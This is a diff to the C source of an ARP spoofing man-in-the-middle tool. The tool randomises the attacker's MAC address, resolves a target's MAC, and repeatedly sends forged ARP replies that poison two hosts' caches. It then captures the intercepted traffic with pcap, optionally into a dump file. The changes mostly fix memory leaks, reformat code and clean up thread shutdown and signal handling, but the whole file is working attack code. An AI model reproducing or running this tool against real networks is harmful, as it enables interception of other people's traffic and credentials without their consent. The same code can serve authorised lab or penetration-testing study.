@@ -1,3 +1,7 @@
+//
+// Created by @RicoVlad on 4/30/23.
+//
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <net/if_arp.h>
@@ -31,7 +35,6 @@ generateRandomMacAddr(unsigned char* mac_addr)
 {
     // Not true RNG but ... who cares ?
     srand((unsigned int) time(NULL));
-
     for(int i = 0; i < ETH_ALEN; i++){
         mac_addr[i] = rand() % 256;
     }
@@ -69,7 +72,6 @@ changeMacAddr(unsigned char* mac_addr, char* interface)
 int
 getMacAddr(unsigned char original_mac[ETH_ALEN], const char* interface)
 {
-
     struct ifreq ifr;
     int sockfd;
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -97,19 +99,20 @@ resolveMacAddr(char *interface, unsigned char *target_ip, unsigned char *random_
 
     // Broadcast mac
     unsigned char broadcast_mac[ETH_ALEN] =
-                {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+            {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
 
     Packet *packet = craftPacket(random_mac,
-                                source_ip,
-                                broadcast_mac,
-                                target_ip,
-                                ARPOP_REQUEST);
+                                 source_ip,
+                                 broadcast_mac,
+                                 target_ip,
+                                 ARPOP_REQUEST);
 
 
-    // Send 5 ARP broadcast packet to "ensure" an answer from target
-    for (int i=0; i<nbRetries; i++){
+    // Send nbRetries ARP broadcast packet to "ensure" an answer from target
+    for (int i=0; i < nbRetries; i++){
         if(sendArpPacket(handle, packet)  < 1 ){
             fprintf(stderr,"Error sending ARP packet when resolving mac addr");
+            free(packet);
             pcap_close(handle);
             exit(EXIT_FAILURE);
         }
@@ -117,16 +120,15 @@ resolveMacAddr(char *interface, unsigned char *target_ip, unsigned char *random_
 
     if(receiveArpPacket(handle, resolved_mac) != 0){
         fprintf(stderr,"Error receiving ARP packet when resolving mac addr");
+        free(packet);
         pcap_close(handle);
         exit(EXIT_FAILURE);
     }
-
 
     free(packet);
     pcap_close(handle);
     return 0;
 }
-
 
 char*
 getIpFromInterface(char* name)
@@ -145,35 +147,26 @@ getIpFromInterface(char* name)
     return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
 }
 
+
 Packet*
 craftPacket(unsigned char *sender_mac, unsigned char* sender_ip, unsigned char *target_mac, unsigned char *target_ip, int ARPOP_CODE)    // Ethernet header
 {
     struct ether_header ethernet_header;
-    // Packet type ID field
-    ethernet_header.ether_type = htons(ETHERTYPE_ARP);
-    // set source mac addr
-    memcpy(ethernet_header.ether_shost, sender_mac, ETH_ALEN);
-    // set destination mac addr
-    memcpy(ethernet_header.ether_dhost, target_mac, ETH_ALEN);
+    ethernet_header.ether_type = htons(ETHERTYPE_ARP); // Packet type ID field
+    memcpy(ethernet_header.ether_shost, sender_mac, ETH_ALEN); // set source mac addr
+    memcpy(ethernet_header.ether_dhost, target_mac, ETH_ALEN); // set destination mac addr
 
     // ARP header
     struct arphdr arp_header;
-    // Format of hardware address
-    arp_header.ar_hrd = htons(ARPHRD_ETHER);
-    // Format of protocol address
-    arp_header.ar_pro = htons(ETHERTYPE_IP);
-    // Length of hardware address
-    arp_header.ar_hln = ETH_ALEN;
-    // Length of protocol address
-    arp_header.ar_pln = 4;
-    // ARP opcode
-    arp_header.ar_op = htons(ARPOP_CODE);
+    arp_header.ar_hrd = htons(ARPHRD_ETHER); // Format of hardware address
+    arp_header.ar_pro = htons(ETHERTYPE_IP); // Format of protocol address
+    arp_header.ar_hln = ETH_ALEN; // Length of hardware address
+    arp_header.ar_pln = 4; // Length of protocol address
+    arp_header.ar_op = htons(ARPOP_CODE); // ARP opcode
 
     // ARP Body
     ArpBody *arp_body = calloc(1,sizeof(ArpBody));
-    // set source mac addr
     memcpy(arp_body->ar_sha, sender_mac, ETH_ALEN);
-    // set destination mac addr
     memcpy(arp_body->ar_tha, target_mac, ETH_ALEN);
 
     memcpy(arp_body->ar_sip, sender_ip, 4);
@@ -182,7 +175,6 @@ craftPacket(unsigned char *sender_mac, unsigned char* sender_ip, unsigned char *
     ArpPacket *arp = calloc(1, sizeof(ArpPacket));
     memcpy(arp,&arp_header,sizeof(struct arphdr));
     memcpy(&arp->body,arp_body,sizeof(ArpBody));
-
 
     Packet *packet = calloc(1,sizeof(Packet));
     memcpy(packet,&ethernet_header,sizeof(struct ether_header));
@@ -239,20 +231,19 @@ void*
 threadSendArpPacket(void* tArgs)
 {
     threadArgs *myArg = (threadArgs*)tArgs;
-    pcap_t *h = prepareConnection(myArg->interface);
+    myArg->handle_send = prepareConnection(myArg->interface);
+    if(myArg->handle_send == NULL){
+        printf("Error while preparing connection to send ARP requests");
+        exit(EXIT_FAILURE);
+    }
 
-    while(1){
-        sendArpPacket(h,&myArg->p[0]);
+    while(myArg->running == 1){
+        sendArpPacket(myArg->handle_send,&myArg->p[0]);
         // Added nanosleep because too much ARP packet are sended otherwise
         nanosleep((const struct timespec[]){{0, myArg->time}}, NULL);
-        sendArpPacket(h,&myArg->p[1]);
-        // Check for a SIGINT signal
-        if (sigint_received == 1) {
-            // Exit the thread if a SIGINT signal is received
-            break;
-        }
+        sendArpPacket(myArg->handle_send,&myArg->p[1]);
     }
-    pcap_close(h);
+    pcap_close(myArg->handle_send);
     pthread_exit(NULL);
 }
 
@@ -329,6 +320,7 @@ u_char *pkt_data)
 {
     pcap_dump(param,header,pkt_data);
 }
+
 void
 packet_handler(u_char *param, const struct pcap_pkthdr *header, const
 u_char *pkt_data)
@@ -342,7 +334,6 @@ u_char *pkt_data)
     struct ip *ip_header;
     struct tcphdr *tcp_header;
     struct udphdr *udp_header;
-
 
     //eth_header = (struct ether_header*) (pkt_data);
     ip_header = (struct ip*) (pkt_data + ETH_HLEN);
@@ -393,58 +384,61 @@ threadHandlePacket(void* tArgs)
     bpf_u_int32 mask;
 
     // Open the pcap device
-    pcap_t *handle = prepareConnection(myArg->interface);
+    myArg->handle_receive = prepareConnection(myArg->interface);
 
     // Get the network and mask information
     if(pcap_lookupnet(myArg->interface, &net, &mask, errbuf) == PCAP_ERROR){
         fprintf(stderr,"Error with pcap_lookupnet");
-        pcap_close(handle);
+        pcap_close(myArg->handle_receive);
         exit(EXIT_FAILURE);
     }
 
     // Compile and apply the filter
-   if (pcap_compile(handle, &fp, myArg->filter, 0, net) == PCAP_ERROR){
-       fprintf(stderr,"Error with pcap_compile\n");
-       fprintf(stderr,"%s",pcap_geterr(handle));
-       pcap_close(handle);
-       exit(EXIT_FAILURE);
-   }
-    if(pcap_setfilter(handle, &fp) != 0){
+    if (pcap_compile(myArg->handle_receive, &fp, myArg->filter, 0, net) == PCAP_ERROR){
+        fprintf(stderr,"Error with pcap_compile\n");
+        fprintf(stderr,"%s",pcap_geterr(myArg->handle_receive));
+        pcap_close(myArg->handle_receive);
+        exit(EXIT_FAILURE);
+    }
+    if(pcap_setfilter(myArg->handle_receive, &fp) != 0){
         fprintf(stderr,"Error with pcap_filter");
-        pcap_close(handle);
+        pcap_close(myArg->handle_receive);
         exit(EXIT_FAILURE);
     }
 
     pcap_dumper_t* dumper = NULL;
 
     if (myArg->output != NULL){
-        dumper = pcap_dump_open_append(handle,myArg->output);
+        dumper = pcap_dump_open_append(myArg->handle_receive,myArg->output);
         // Start capturing packets and call function to save output to file
-        pcap_loop(handle, -1, packet_handler_saveToFile, (u_char*) dumper);
+        if (dumper != NULL){
+            pcap_loop(myArg->handle_receive, -1, packet_handler_saveToFile, (u_char*) dumper);
+        }else{
+            printf("Error with pcap_dump_open_append");
+            exit(EXIT_FAILURE);
+        }
     }else{
         // Start capturing packets and call function packet_handler
-        pcap_loop(handle, -1, packet_handler, NULL);
+        pcap_loop(myArg->handle_receive, -1, packet_handler, NULL);
     }
 
-
-    if (sigint_received == 1) {
-        printf("SIGINT RECEIVED");
-        pcap_dump_close(dumper);
-        // Exit the thread if a SIGINT signal is received
-        pcap_close(handle);
-        pthread_exit(NULL);
-    }
-    return NULL;
+    // Called when main loop call pcap_breakloop
+    if(dumper != NULL) pcap_dump_close(dumper);
+    pcap_close(myArg->handle_receive);
+    pthread_exit(NULL);
 }
 
-void sigint_handler(int sig) {
-
+void
+sigint_handler(int sig)
+{
     sigint_received = 1;
-    pthread_kill(t1,SIGINT);
-    pthread_kill(t2,SIGINT);
+    //pthread_kill(t1,SIGINT);
+    //pthread_kill(t2,SIGINT);
 }
 
-static error_t parse_opt(int key, char *arg, struct argp_state *state) {
+static error_t
+parse_opt(int key, char *arg, struct argp_state *state)
+{
     AttackSettings *arguments = state->input;
     switch (key) {
         case 'i': arguments->interface = arg; break;
@@ -463,10 +457,13 @@ static error_t parse_opt(int key, char *arg, struct argp_state *state) {
             break;
         default: return ARGP_ERR_UNKNOWN;
     }
+
     return 0;
 }
 
-char* read_file(char* filename) {
+char*
+read_file(char* filename)
+{
     FILE *fp;
     char *buffer;
     long file_size;
@@ -480,8 +477,6 @@ char* read_file(char* filename) {
     fseek(fp, 0L, SEEK_END);
     file_size = ftell(fp);
     rewind(fp);
-
-    //printf("File size: %ld", file_size);
 
     buffer = (char*) calloc (1,file_size);
     if (!buffer) {
@@ -515,10 +510,10 @@ main(int argc, char *argv[])
             .time = 50000
     };
 
-
-    struct sigaction sa = {{sigint_handler}};
-
-
+    struct sigaction sa = {
+            {sigint_handler},
+            .sa_flags = SA_RESTART,
+    };
     if (sigaction(SIGINT, &sa, NULL) == -1)
     {
         perror("sigaction() failed");
@@ -553,19 +548,18 @@ main(int argc, char *argv[])
     }
     printf("Interface = %s\n", settings.interface);
 
-
     getMacAddr(settings.original_mac, settings.interface);
     printf("\nOriginal MAC Address:");
     for(int i=0; i< ETH_ALEN;i++){
         printf("%02x%s", settings.original_mac[i],(i == ETH_ALEN - 1) ? "\n" : ":");
     }
+
     generateRandomMacAddr(settings.random_mac);
     changeMacAddr(settings.random_mac,settings.interface);
     printf("\nRandomized MAC Address: ");
     for(int i=0; i< ETH_ALEN;i++){
         printf("%02x%s", settings.random_mac[i],(i == ETH_ALEN - 1) ? "\n" : ":");
     }
-
 
     printf("\nResolving Target MAC Address ...\n");
     resolveMacAddr(settings.interface,
@@ -594,26 +588,28 @@ main(int argc, char *argv[])
     // Spoofed packet for target_ip
     Packet *p2 = craftPacket(settings.random_mac,
                              settings.impersonate_ip,
-                              settings.target_mac,
-                              settings.target_ip,
-                              ARPOP_REPLY);
+                             settings.target_mac,
+                             settings.target_ip,
+                             ARPOP_REPLY);
 
     // Spoofed packet for impersonate_ip
     Packet *p3 = craftPacket(settings.random_mac,
-                              settings.target_ip,
-                              settings.impersonate_mac,
-                              settings.impersonate_ip,
-                              ARPOP_REPLY);
+                             settings.target_ip,
+                             settings.impersonate_mac,
+                             settings.impersonate_ip,
+                             ARPOP_REPLY);
 
     // THREAD TIME
     threadArgs tArgs;
     tArgs.interface = settings.interface;
+    tArgs.handle_send = NULL;
+    tArgs.handle_receive = NULL;
     tArgs.p[0] = *p2;
     tArgs.p[1] = *p3;
     tArgs.time = settings.time;
     tArgs.filter = settings.filter;
     tArgs.output = settings.output;
-
+    tArgs.running = 1;
 
     //filter == not arp and host argv[1] and host argv[2]\0
     if(settings.filter == NULL){
@@ -635,6 +631,13 @@ main(int argc, char *argv[])
     while (sigint_received != 1){
         nanosleep((const struct timespec[]){{0,500000000L}}, NULL);
     }
+
+    printf("Cleaning ...\n");
+
+    tArgs.running = 0;
+    pcap_breakloop(tArgs.handle_receive);
+    pthread_join(t1,NULL);
+    pthread_join(t2,NULL);
 
     changeMacAddr(settings.original_mac,settings.interface);
 
